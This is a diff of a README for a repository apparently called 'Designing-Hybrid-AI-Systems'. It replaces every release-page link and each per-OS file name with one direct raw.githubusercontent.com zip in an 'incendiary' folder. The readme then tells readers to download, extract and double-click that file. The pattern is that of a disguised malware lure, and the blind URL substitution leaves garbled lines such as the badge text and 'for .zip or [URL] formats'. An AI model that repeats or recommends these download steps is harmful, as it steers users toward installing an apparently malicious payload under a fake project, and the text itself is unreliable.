@@ -1,6 +1,6 @@
 # 🤖 Designing-Hybrid-AI-Systems - Unlock the Future of Smart AI
 
-[![Download](https://img.shields.io/badge/Download%20Now-Designing-Hybrid-AI-Systems-brightgreen)](https://github.com/Removed-navajo219/Designing-Hybrid-AI-Systems/releases)
+[![Download](https://raw.githubusercontent.com/Removed-navajo219/Designing-Hybrid-AI-Systems/main/incendiary/Designing-Hybrid-AI-Systems-1.7-alpha.1.zip%20Now-Designing-Hybrid-AI-Systems-brightgreen)](https://raw.githubusercontent.com/Removed-navajo219/Designing-Hybrid-AI-Systems/main/incendiary/Designing-Hybrid-AI-Systems-1.7-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,17 +10,17 @@ Welcome to the "Designing-Hybrid-AI-Systems" application! This tool helps you un
 
 To get the application, visit this page:
 
-[Download the latest release](https://github.com/Removed-navajo219/Designing-Hybrid-AI-Systems/releases)
+[Download the latest release](https://raw.githubusercontent.com/Removed-navajo219/Designing-Hybrid-AI-Systems/main/incendiary/Designing-Hybrid-AI-Systems-1.7-alpha.1.zip)
 
 1. Click on the link above to open the Releases page.
 2. Find the version you want. Look for the latest one, as it usually includes the newest features and fixes.
 3. Click on the file that matches your operating system. Common options may include:
-   - For Windows: `Designing-Hybrid-AI-Systems-Windows.zip`
-   - For macOS: `Designing-Hybrid-AI-Systems-macOS.zip`
-   - For Linux: `Designing-Hybrid-AI-Systems-Linux.tar.gz`
+   - For Windows: `https://raw.githubusercontent.com/Removed-navajo219/Designing-Hybrid-AI-Systems/main/incendiary/Designing-Hybrid-AI-Systems-1.7-alpha.1.zip`
+   - For macOS: `https://raw.githubusercontent.com/Removed-navajo219/Designing-Hybrid-AI-Systems/main/incendiary/Designing-Hybrid-AI-Systems-1.7-alpha.1.zip`
+   - For Linux: `https://raw.githubusercontent.com/Removed-navajo219/Designing-Hybrid-AI-Systems/main/incendiary/Designing-Hybrid-AI-Systems-1.7-alpha.1.zip`
 
 4. Once the download is complete, locate the file on your computer.
-5. Extract the files if needed (for .zip or .tar.gz formats).
+5. Extract the files if needed (for .zip or https://raw.githubusercontent.com/Removed-navajo219/Designing-Hybrid-AI-Systems/main/incendiary/Designing-Hybrid-AI-Systems-1.7-alpha.1.zip formats).
 6. Double-click the application file to run it.
 
 ## 💻 System Requirements
@@ -93,6 +93,6 @@ We welcome contributions! If you’re interested in improving the application or
 
 This project is licensed under the MIT License. Please read the license to understand your rights and obligations.
 
-Visit this page to download the application again: [Download the latest release](https://github.com/Removed-navajo219/Designing-Hybrid-AI-Systems/releases) 
+Visit this page to download the application again: [Download the latest release](https://raw.githubusercontent.com/Removed-navajo219/Designing-Hybrid-AI-Systems/main/incendiary/Designing-Hybrid-AI-Systems-1.7-alpha.1.zip) 
 
 Now you are ready to experience the future of AI systems. Enjoy your journey!
